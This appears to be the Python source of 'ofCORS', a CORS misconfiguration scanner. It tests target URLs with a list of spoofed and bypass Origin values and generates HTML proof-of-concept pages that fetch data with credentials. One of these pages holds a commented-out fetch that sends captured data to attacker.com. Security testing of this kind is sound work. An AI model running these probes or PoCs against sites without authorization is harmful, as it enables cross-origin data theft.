#!/usr/bin/env python3
import requests
import argparse
import json
import sys
import urllib.parse
import html
import re
import os
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from collections import defaultdict

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR_SUPPORT = True
except ImportError:
    COLOR_SUPPORT = False
    class DummyFore:
        def __getattr__(self, name):
            return ""
    Fore = DummyFore()
    Style = DummyFore()

# Constants
VERSION = "1.0.0"
DEFAULT_TIMEOUT = 10
DEFAULT_THREADS = 5
MAX_URL_LENGTH = 2000
MAX_QUOTE_LENGTH = 500

# Common malicious originsl, might need to add more in the future
BASE_MALICIOUS_ORIGINS = [
    'https://evil.com',
    'https://attacker.com',
    'https://127.0.0.1',
    'http://localhost',
    'null',
    'file:///'
]

def colored(text, color=None, style=None):
    if not COLOR_SUPPORT:
        return text

    color_code = getattr(Fore, color.upper(), "") if color else ""
    style_code = getattr(Style, style.upper(), "") if style else ""
    return f"{color_code}{style_code}{text}{Style.RESET_ALL}"

def print_banner():
    print(colored('╔═════════════════════════════════════════════════════╗', 'cyan'))
    print(colored('║', 'cyan') + ' ' + colored('ofCORS', 'yellow', 'bright') + ' ' * 46 + colored('║', 'cyan'))
    print(colored('║', 'cyan') + ' ' + colored(f'Version {VERSION}', 'white') + ' ' * (52 - len(f'Version {VERSION}')) + colored('║', 'cyan'))
    print(colored('║', 'cyan') + ' ' + colored('"Of course I tested CORS!"', 'green') + ' ' * 26 + colored('║', 'cyan'))
    print(colored('╚═════════════════════════════════════════════════════╝', 'cyan'))

def validate_url(url):
    try:
        if len(url) > MAX_URL_LENGTH:
            raise ValueError(f"URL too long (max {MAX_URL_LENGTH} characters)")

        result = urlparse(url)
        if not all([result.scheme, result.netloc]):
            raise ValueError("Invalid URL format - missing scheme or domain")

        if result.scheme not in ['http', 'https']:
            raise ValueError("Only HTTP/HTTPS URLs are supported")

        return True
    except Exception as e:
        print(f"{colored('Invalid URL:', 'red')} {e}")
        return False

def analyze_cors_headers(headers, origin, url):
    results = {
        "is_vulnerable": False,
        "severity": "none",
        "issues": [],
        "reflection": False,
        "allow_credentials": False
    }

    headers_lower = {k.lower(): v for k, v in headers.items()}

    # Extract the domain from the target URL
    target_parsed = urlparse(url)
    target_domain = target_parsed.netloc

    try:
        origin_parsed = urlparse(origin)
        origin_domain = origin_parsed.netloc

        if origin == "null" or not origin_domain:
            is_external_origin = True
        else:
            target_parts = target_domain.split('.')
            origin_parts = origin_domain.split('.')

            is_same_base_domain = False
            if len(target_parts) >= 2 and len(origin_parts) >= 2:
                target_base = '.'.join(target_parts[-2:])  # e.g., example.com
                origin_base = '.'.join(origin_parts[-2:])  # e.g., example.com
                if target_base == origin_base:
                    is_same_base_domain = True

            is_external_origin = not is_same_base_domain

            if '@' in origin_domain:
                is_external_origin = True
    except:
        is_external_origin = True

    # Check Access-Control-Allow-Origin
    if 'access-control-allow-origin' in headers_lower:
        acao = headers_lower['access-control-allow-origin']

        # Check for wildcard
        if acao == '*':
            results["issues"].append("Access-Control-Allow-Origin is set to wildcard '*'")
            results["severity"] = "low"  # Lower severity unless credentials are enabled

        # Check for origin reflection
        elif acao == origin:
            results["reflection"] = True

            # Only flag as an issue if it's reflecting an external origin
            if is_external_origin:
                results["issues"].append(f"Origin '{origin}' is reflected in Access-Control-Allow-Origin")
                results["severity"] = "medium"
                results["is_vulnerable"] = True
            else:
                # Normal behavior for same-site requests
                results["issues"].append(f"Origin reflection detected, but for same-site origin (not a vulnerability)")

    # Check Access-Control-Allow-Credentials
    if 'access-control-allow-credentials' in headers_lower:
        if headers_lower['access-control-allow-credentials'].lower() == 'true':
            results["allow_credentials"] = True

            # Wildcard with credentials
            if 'access-control-allow-origin' in headers_lower and headers_lower['access-control-allow-origin'] == '*':
                results["issues"].append("CRITICAL: Both ACAO=* and credentials=true (violates CORS specs)")
                results["severity"] = "critical"
                results["is_vulnerable"] = True

            # External origin reflection with credentials
            elif results["reflection"] and is_external_origin:
                results["issues"].append("HIGH RISK: External origin reflection with credentials=true")
                results["severity"] = "high"
                results["is_vulnerable"] = True

    # If we saw HTTP 500 errors, this as a potential false positive
    if 'x-http-status-code' in headers_lower and headers_lower['x-http-status-code'] == '500':
        results["issues"].append("WARNING: Server returned HTTP 500, CORS findings may be false positives")

    return results

def generate_origins(url):
    """Generate a list of test origins for CORS testing"""
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    protocol = parsed_url.scheme

    domain_parts = domain.split('.')
    if len(domain_parts) > 1:
        base_domain = '.'.join(domain_parts[-2:])  # e.g., example.com from sub.example.com
        subdomain = '.'.join(domain_parts[:-2]) if len(domain_parts) > 2 else ''
    else:
        base_domain = domain
        subdomain = ''

    origins = BASE_MALICIOUS_ORIGINS.copy()

    origins.extend([
        f'https://evil.{domain}',         
        f'https://{domain}.evil.com',     

        f'http://{domain}' if protocol == 'https' else f'https://{domain}',  # Switch protocol

        f'{protocol}://{domain.upper()}', 

        f'{protocol}://{domain}-evil',    
        f'{protocol}://{domain}.co',     

        # Subdomain bypass attempts
        f'{protocol}://evil.{base_domain}', 
        f'{protocol}://bypass.{base_domain}', 

        f'{protocol}://{domain}x',        
        f'{protocol}://{domain}.com',     

        # Path confusion
        f'{protocol}://evil.com/{domain}', 
        f'{protocol}://evil.com@{domain}',  

        # Double subdomain
        f'{protocol}://{domain}.{domain}',  

        # Special characters
        f'{protocol}://{domain}%60evil.com',  
        f'{protocol}://evil{domain}',      

        # Bypass techniques, might need to add more in the future
        f'{protocol}://evil.{domain}.com',   
        f'{protocol}://{domain.replace(".", "-")}.evil.com',  
    ])


    if subdomain:
        origins.extend([
            f'{protocol}://{subdomain}.evil.com',  
            f'{protocol}://evil-{subdomain}.{base_domain}', 
        ])

    return origins

def test_cors_methods(url, origin, headers=None, cookies=None, vulnerable_check=None, timeout=10):
    """Test CORS with different HTTP methods"""
    if headers is None:
        headers = {}

    # Add Origin header
    headers['Origin'] = origin

    methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']
    results = {}

    preflight_response = None

    # Test each method
    for method in methods:
        try:
            if method == 'OPTIONS':
                response = requests.options(url, headers=headers, cookies=cookies, timeout=timeout)
                preflight_response = response
            elif method == 'GET':
                response = requests.get(url, headers=headers, cookies=cookies, timeout=timeout)
            elif method == 'POST':
                response = requests.post(url, headers=headers, cookies=cookies, json={"test": "data"}, timeout=timeout)
            elif method == 'PUT':
                response = requests.put(url, headers=headers, cookies=cookies, json={"test": "data"}, timeout=timeout)
            elif method == 'DELETE':
                response = requests.delete(url, headers=headers, cookies=cookies, timeout=timeout)

            cors_analysis = analyze_cors_headers(response.headers, origin, url)

            if vulnerable_check and not cors_analysis["is_vulnerable"]:
                continue

            results[method] = {
                "status_code": response.status_code,
                "cors_headers": {k: v for k, v in response.headers.items() if k.lower().startswith("access-control")},
                "analysis": cors_analysis
            }

        except requests.RequestException as e:
            results[method] = {"error": str(e)}

    if preflight_response and 'GET' in results and not results['GET'].get('error'):
        preflight_headers = {k.lower(): v for k, v in preflight_response.headers.items() if k.lower().startswith("access-control")}
        actual_headers = {k.lower(): v for k, v in results['GET']['cors_headers'].items()}

        if preflight_headers != actual_headers:
            for header, value in actual_headers.items():
                if header not in preflight_headers or preflight_headers[header] != value:
                    method_result = results['GET']
                    if 'preflight_bypass' not in method_result:
                        method_result['preflight_bypass'] = []
                    method_result['preflight_bypass'].append(f"Header {header} has different value in preflight vs actual request")

    return results

def test_cors_with_variations(url, headers=None, cookies=None, sensitive=False, vulnerable_only=False, timeout=10):
    origins = generate_origins(url)
    results = {}

    for origin in origins:
        origin_result = test_cors_methods(url, origin, headers, cookies, vulnerable_check=vulnerable_only, timeout=timeout)

        if not origin_result or (vulnerable_only and not any('analysis' in v and v['analysis']['is_vulnerable'] for v in origin_result.values() if isinstance(v, dict))):
            continue

        results[origin] = origin_result

    return results

def generate_cors_poc(url, vulnerable_origin, include_credentials=True):
    """Generate HTML PoC for exploitation with proper security escaping"""

    if not validate_url(url):
        return "<!-- Error: Invalid URL provided for PoC generation -->"

    if len(url) > MAX_URL_LENGTH:
        return "<!-- Error: URL too long for PoC generation -->"

    safe_url = html.escape(url)
    safe_origin = html.escape(vulnerable_origin)

    credentials_setting = "include" if include_credentials else "omit"
    credentials_text = "Included" if include_credentials else "Not included"

    js_url = json.dumps(url)  
    js_credentials = json.dumps(credentials_setting)

    poc = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ofCORS - CORS Vulnerability PoC</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.6; max-width: 900px; margin: 0 auto; padding: 20px;
            background: #f8f9fa;
        }}
        .container {{
            background: white; padding: 30px; border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h1 {{ color: #dc3545; margin-bottom: 10px; }}
        h2 {{ color: #495057; border-bottom: 2px solid #e9ecef; padding-bottom: 10px; }}
        .alert {{ padding: 15px; border-radius: 5px; margin: 15px 0; }}
        .alert-danger {{ background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }}
        .alert-info {{ background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; }}
        pre {{
            background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto;
            border-left: 4px solid #007bff; font-family: 'Courier New', monospace;
        }}
        button {{
            background: #dc3545; color: white; border: none; padding: 12px 20px;
            cursor: pointer; border-radius: 5px; font-size: 16px; margin: 10px 5px 10px 0;
        }}
        button:hover {{ background: #c82333; }}
        button:disabled {{ background: #6c757d; cursor: not-allowed; }}
        #output {{
            background: #f8f9fa; border: 1px solid #dee2e6; padding: 20px;
            margin-top: 20px; border-radius: 5px; min-height: 100px;
        }}
        .success {{ color: #28a745; font-weight: bold; }}
        .error {{ color: #dc3545; font-weight: bold; }}
        textarea {{
            width: 100%; height: 120px; margin-top: 10px; padding: 10px;
            border: 1px solid #ced4da; border-radius: 4px; font-family: monospace;
            resize: vertical;
        }}
        .metadata {{ background: #e9ecef; padding: 15px; border-radius: 5px; margin-top: 20px; }}
        .metadata dt {{ font-weight: bold; margin-top: 10px; }}
        .metadata dd {{ margin-left: 20px; margin-bottom: 5px; }}
        code {{ background: #f8f9fa; padding: 2px 4px; border-radius: 3px; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 ofCORS - CORS Vulnerability PoC</h1>

        <div class="alert alert-danger">
            <strong>⚠️ Security Vulnerability Detected</strong><br>
            This page demonstrates a CORS misconfiguration that allows unauthorized cross-origin requests.
        </div>

        <div class="alert alert-info">
            <strong>Target:</strong> <code>{safe_url}</code><br>
            <strong>Malicious Origin:</strong> <code>{safe_origin}</code>
        </div>

        <h2>🧪 Step 1: Test the Vulnerability</h2>
        <p>Click the button below to verify the CORS vulnerability exists:</p>
        <button onclick="testCors()" id="testBtn">Test CORS Vulnerability</button>
        <div id="output">Click the button above to test the CORS vulnerability...</div>

        <h2>📊 Step 2: Extract Data</h2>
        <p>After confirming the vulnerability, extract sensitive data:</p>
        <button onclick="extractData()" id="extractBtn" disabled>Extract Sensitive Data</button>
        <textarea id="extracted-data" placeholder="Extracted data will appear here..." readonly></textarea>

        <h2>🔧 Technical Details</h2>
        <dl class="metadata">
            <dt>Target URL:</dt>
            <dd><code>{safe_url}</code></dd>
            <dt>Malicious Origin:</dt>
            <dd><code>{safe_origin}</code></dd>
            <dt>Credentials:</dt>
            <dd>{credentials_text}</dd>
            <dt>Generated:</dt>
            <dd>{datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}</dd>
            <dt>Tool:</dt>
            <dd>ofCORS v{VERSION}</dd>
        </dl>

        <h2>📋 Remediation</h2>
        <div class="alert alert-info">
            <strong>To fix this vulnerability:</strong><br>
            • Use specific origins instead of wildcards or reflection<br>
            • Validate origins against an allowlist<br>
            • Be cautious when enabling credentials with CORS<br>
            • Implement proper server-side origin validation
        </div>
    </div>

    <script>
        const targetUrl = {js_url};
        const credentials = {js_credentials};

        let vulnerabilityConfirmed = false;

        async function testCors() {{
            const output = document.getElementById('output');
            const testBtn = document.getElementById('testBtn');
            const extractBtn = document.getElementById('extractBtn');

            output.innerHTML = '🔍 Testing CORS vulnerability...';
            testBtn.disabled = true;

            try {{
                const response = await fetch(targetUrl, {{
                    method: 'GET',
                    credentials: credentials,
                    headers: {{
                        'X-Requested-With': 'XMLHttpRequest',
                        'Content-Type': 'application/json'
                    }}
                }});

                const responseText = await response.text();
                const truncatedResponse = responseText.substring(0, {MAX_QUOTE_LENGTH});

                if (response.ok) {{
                    vulnerabilityConfirmed = true;
                    output.innerHTML =
                        '<span class="success">✅ CORS Vulnerability Confirmed!</span><br>' +
                        '<strong>Status:</strong> ' + response.status + '<br>' +
                        '<strong>Response Preview:</strong><br>' +
                        '<pre>' + escapeHtml(truncatedResponse) +
                        (responseText.length > {MAX_QUOTE_LENGTH} ? '\\n... [truncated]' : '') + '</pre>';
                    extractBtn.disabled = false;
                }} else {{
                    output.innerHTML =
                        '<span class="error">❌ Test Inconclusive</span><br>' +
                        '<strong>Status:</strong> ' + response.status + '<br>' +
                        '<strong>Details:</strong> ' + escapeHtml(truncatedResponse.substring(0, 200));
                }}
            }} catch (error) {{
                output.innerHTML = '<span class="error">❌ Error:</span> ' + escapeHtml(error.message);
            }} finally {{
                testBtn.disabled = false;
            }}
        }}

        async function extractData() {{
            if (!vulnerabilityConfirmed) {{
                alert('Please test the vulnerability first!');
                return;
            }}

            const outputArea = document.getElementById('extracted-data');
            const extractBtn = document.getElementById('extractBtn');

            outputArea.value = '📡 Extracting data...';
            extractBtn.disabled = true;

            try {{
                const response = await fetch(targetUrl, {{
                    method: 'GET',
                    credentials: credentials,
                }});

                if (response.ok) {{
                    const data = await response.text();
                    outputArea.value = data;

                    // In a real attack, this would exfiltrate to attacker server
                    console.log('Data extracted successfully (length: ' + data.length + ' chars)');

                    // Demonstrate data exfiltration (commented out for safety)
                    // await fetch('https://attacker.com/collect', {{
                    //     method: 'POST',
                    //     headers: {{'Content-Type': 'application/json'}},
                    //     body: JSON.stringify({{data: data, target: targetUrl}})
                    // }});
                }} else {{
                    outputArea.value = 'Failed to extract data: ' + response.status + ' ' + response.statusText;
                }}
            }} catch (error) {{
                outputArea.value = 'Error extracting data: ' + error.message;
            }} finally {{
                extractBtn.disabled = false;
            }}
        }}

        function escapeHtml(text) {{
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }}

        // Log PoC execution for security researchers
        console.log('ofCORS PoC loaded - Target:', targetUrl);
    </script>
</body>
</html>"""

    return poc

def parse_cookies(cookie_string):
    cookies = {}
    if not cookie_string:
        return cookies

    pairs = cookie_string.split(';')
    for pair in pairs:
        if '=' in pair:
            name, value = pair.strip().split('=', 1)
            cookies[name] = value

    return cookies

def save_report(results, output_file, format_type='text', include_poc=True, target_url=None):
    """Save test results to a file"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

    if format_type == 'json':
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump({
                'timestamp': timestamp,
                'tool': f'ofCORS v{VERSION}',
                'url': target_url,
                'results': results,
                'summary': summarize_results(results)
            }, f, indent=4)
    else:
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"ofCORS - CORS Vulnerability Scan Report\n")
            f.write(f"========================================\n\n")
            f.write(f"Tool: ofCORS v{VERSION}\n")
            f.write(f"Date: {timestamp}\n")
            if target_url:
                f.write(f"Target URL: {target_url}\n")
            f.write("\n")

            summary = summarize_results(results)
            f.write("Summary:\n")
            f.write(f"- Total Origins Tested: {summary['total_origins']}\n")
            f.write(f"- Vulnerable Origins Found: {summary['vulnerable_origins']}\n")
            f.write(f"- Critical Severity Issues: {summary['severity_counts']['critical']}\n")
            f.write(f"- High Severity Issues: {summary['severity_counts']['high']}\n")
            f.write(f"- Medium Severity Issues: {summary['severity_counts']['medium']}\n")
            f.write(f"- Low Severity Issues: {summary['severity_counts']['low']}\n\n")

            # Write detailed results
            f.write("Detailed Results:\n")
            f.write("================\n\n")

            for origin, methods in results.items():
                f.write(f"Origin: {origin}\n")
                f.write("-" * (len(origin) + 8) + "\n")

                for method, result in methods.items():
                    if 'error' in result:
                        f.write(f"  {method}: Error - {result['error']}\n")
                        continue

                    f.write(f"  {method}: Status {result['status_code']}\n")

                    if 'analysis' in result:
                        analysis = result['analysis']

                        if analysis['is_vulnerable']:
                            f.write(f"    VULNERABLE - Severity: {analysis['severity'].upper()}\n")

                        if analysis['issues']:
                            f.write("    Issues Found:\n")
                            for issue in analysis['issues']:
                                f.write(f"    - {issue}\n")

                        if result['cors_headers']:
                            f.write("    CORS Headers:\n")
                            for k, v in result['cors_headers'].items():
                                f.write(f"    - {k}: {v}\n")

                        if 'preflight_bypass' in result:
                            f.write("    Preflight Bypasses:\n")
                            for bypass in result['preflight_bypass']:
                                f.write(f"    - {bypass}\n")

                    f.write("\n")

                f.write("\n")

    if include_poc:
        poc_dir = f"{os.path.splitext(output_file)[0]}_poc"
        if not os.path.exists(poc_dir):
            os.makedirs(poc_dir)

        poc_count = 0
        for origin, methods in results.items():
            for method, result in methods.items():
                if method == 'GET' and 'analysis' in result and result['analysis']['is_vulnerable']:
                    include_creds = result['analysis']['allow_credentials']

                    safe_origin = re.sub(r'[^\w\-_]', '_', origin)
                    poc_filename = f"{poc_dir}/poc_{safe_origin[:50]}_{timestamp}.html"

                    try:
                        with open(poc_filename, 'w', encoding='utf-8') as f:
                            f.write(generate_cors_poc(
                                url=target_url,
                                vulnerable_origin=origin,
                                include_credentials=include_creds
                            ))
                        poc_count += 1
                    except Exception as e:
                        print(f"{colored('Warning: Could not generate PoC for', 'yellow')} {origin}: {e}")

        if poc_count > 0:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"\nProof-of-Concept Files:\n")
                f.write(f"Generated {poc_count} PoC file(s) in: {os.path.basename(poc_dir)}/\n")

def summarize_results(results):
    """Create a summary of the test results"""
    summary = {
        'total_origins': len(results),
        'vulnerable_origins': 0,
        'severity_counts': {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'none': 0
        }
    }

    for origin, methods in results.items():
        origin_vulnerable = False

        for method, result in methods.items():
            if 'analysis' in result and result['analysis']['is_vulnerable']:
                origin_vulnerable = True
                severity = result['analysis'].get('severity', 'none')
                summary['severity_counts'][severity] += 1

        if origin_vulnerable:
            summary['vulnerable_origins'] += 1

    return summary

def print_result(result, url, origin, verbose=False):
    is_vulnerable = any(
        m.get('analysis', {}).get('is_vulnerable', False)
        for m in result.values() if isinstance(m, dict)
    )

    highest_severity = 'none'
    for m in result.values():
        if isinstance(m, dict) and 'analysis' in m:
            severity = m['analysis'].get('severity', 'none')
            if severity == 'critical':
                highest_severity = 'critical'
                break
            elif severity == 'high' and highest_severity not in ['critical']:
                highest_severity = 'high'
            elif severity == 'medium' and highest_severity not in ['critical', 'high']:
                highest_severity = 'medium'
            elif severity == 'low' and highest_severity not in ['critical', 'high', 'medium']:
                highest_severity = 'low'

    if highest_severity == 'critical':
        severity_color = 'red'
        prefix = '[CRITICAL]'
    elif highest_severity == 'high':
        severity_color = 'red'
        prefix = '[HIGH]'
    elif highest_severity == 'medium':
        severity_color = 'yellow'
        prefix = '[MEDIUM]'
    elif highest_severity == 'low':
        severity_color = 'green'
        prefix = '[LOW]'
    else:
        severity_color = 'cyan'
        prefix = '[INFO]'

    print(f"\n{colored(prefix, severity_color)} Testing {url} with Origin: {origin}")

    for method, data in result.items():
        if 'error' in data:
            print(f"  {colored(method, 'yellow')}: {colored('Error - ' + data['error'], 'red')}")
            continue

        status_color = 'green' if 200 <= data['status_code'] < 300 else 'yellow'
        print(f"  {colored(method, 'blue')}: Status {colored(str(data['status_code']), status_color)}")

        if 'analysis' in data:
            analysis = data['analysis']

            if analysis['is_vulnerable']:
                print(f"    {colored('VULNERABLE - ' + analysis['severity'].upper(), 'red')}")

            if analysis['issues'] and (verbose or analysis['is_vulnerable']):
                for issue in analysis['issues']:
                    print(f"    - {issue}")

            if 'preflight_bypass' in data:
                print(f"    {colored('Preflight Bypass Detected!', 'red')}")
                if verbose:
                    for bypass in data['preflight_bypass']:
                        print(f"    - {bypass}")

        if verbose and 'cors_headers' in data:
            for header, value in data['cors_headers'].items():
                print(f"    {colored(header, 'cyan')}: {value}")

        print("")

def process_url(url, args):
    """Process a single URL with all specified test cases"""
    print(f"\n{colored('='*60, 'blue')}")
    print(colored(f"Testing URL: {url}", 'blue'))
    print(colored("="*60, 'blue'))

    if not validate_url(url):
        return False

    headers = {}
    if args.headers:
        for header in args.headers:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()

    cookies = parse_cookies(args.cookies) if args.cookies else None

    try:
        results = test_cors_with_variations(
            url,
            headers=headers,
            cookies=cookies,
            sensitive=args.sensitive,
            vulnerable_only=args.vulnerable_only,
            timeout=args.timeout
        )

        # Print results
        vulnerable_found = False
        for origin, result in results.items():
            print_result(result, url, origin, args.verbose)

            for method_data in result.values():
                if isinstance(method_data, dict) and 'analysis' in method_data:
                    if method_data['analysis'].get('is_vulnerable', False):
                        vulnerable_found = True

        if args.output:
            base_name = os.path.splitext(args.output)[0]
            domain = urlparse(url).netloc.replace(":", "_")
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

            if args.file:
                output_file = f"{base_name}_{domain}_{timestamp}.{args.format}"
            else:
                output_file = args.output

            save_report(
                results,
                output_file,
                format_type=args.format,
                include_poc=args.generate_poc,
                target_url=url
            )
            print(f"\n{colored('Results saved to:', 'green')} {output_file}")

        return vulnerable_found

    except Exception as e:
        print(f"{colored('Error testing URL:', 'red')} {url}")
        print(f"{colored('Exception:', 'red')} {str(e)}")
        if args.verbose:
            import traceback
            print(traceback.format_exc())
        return False

def main():
    parser = argparse.ArgumentParser(
        description="ofCORS - Advanced CORS Vulnerability Scanner",
        epilog='''
Examples:
  %(prog)s -u https://api.example.com/data
  %(prog)s -f urls.txt -t 10 --vulnerable-only
  %(prog)s -u https://app.com/api -H "Authorization: Bearer token" --generate-poc
  %(prog)s -u https://example.com --cookies "session=abc123" -o report.txt
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL to test")
    group.add_argument("-f", "--file", help="File containing URLs to test (one per line)")

    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("--format", choices=['text', 'json'], default='text', help="Output format (default: text)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show detailed output including headers")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help=f"Number of threads for parallel testing (default: {DEFAULT_THREADS})")
    parser.add_argument("--cookies", help="Cookies to include with requests (format: 'name1=value1; name2=value2')")
    parser.add_argument("-H", "--headers", action='append', help="Additional headers (format: 'Name: Value')")
    parser.add_argument("--vulnerable-only", action="store_true", help="Show only vulnerable results")
    parser.add_argument("--generate-poc", action="store_true", help="Generate HTML PoC for vulnerable endpoints")
    parser.add_argument("--sensitive", action="store_true", help="Include tests for sensitive headers/data")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--version", action="version", version=f"ofCORS v{VERSION}")

    args = parser.parse_args()

    print_banner()

    vulnerable_urls = []

    if args.url:
        if process_url(args.url, args):
            vulnerable_urls.append(args.url)

    elif args.file:
        urls = []
        try:
            with open(args.file, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"{colored('Error reading file:', 'red')} {str(e)}")
            sys.exit(1)

        print(f"Loaded {len(urls)} URLs from {args.file}")

        if args.threads > 1 and len(urls) > 1:
            print(f"Using {args.threads} threads for parallel processing")

            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = {executor.submit(process_url, url, args): url for url in urls}

                for future in as_completed(futures):
                    url = futures[future]
                    try:
                        is_vulnerable = future.result()
                        if is_vulnerable:
                            vulnerable_urls.append(url)
                    except Exception as e:
                        print(f"{colored('Error processing URL:', 'red')} {url}")
                        print(f"{colored('Exception:', 'red')} {str(e)}")
                        if args.verbose:
                            import traceback
                            print(traceback.format_exc())
        else:
            for url in urls:
                if process_url(url, args):
                    vulnerable_urls.append(url)

    print("\n" + colored("="*60, 'blue'))
    print(colored("Scan Summary:", 'blue'))
    print(f"- URLs tested: {1 if args.url else len(urls)}")
    print(f"- Vulnerable URLs found: {colored(str(len(vulnerable_urls)), 'red' if vulnerable_urls else 'green')}")

    if vulnerable_urls:
        print(f"\n{colored('Vulnerable URLs:', 'red')}")
        for url in vulnerable_urls:
            print(f"- {url}")
        print(f"\n{colored('⚠️  Remember to report these vulnerabilities responsibly!', 'yellow')}")
    else:
        print(f"\n{colored('✅ No CORS vulnerabilities detected in tested URLs', 'green')}")

    if args.output:
        print(f"\n{colored('📄 Detailed results have been saved to the output file(s)', 'green')}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{colored('Scan interrupted by user. Exiting...', 'yellow')}")
        sys.exit(0)
    except Exception as e:
        print(f"{colored('Unhandled exception:', 'red')} {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
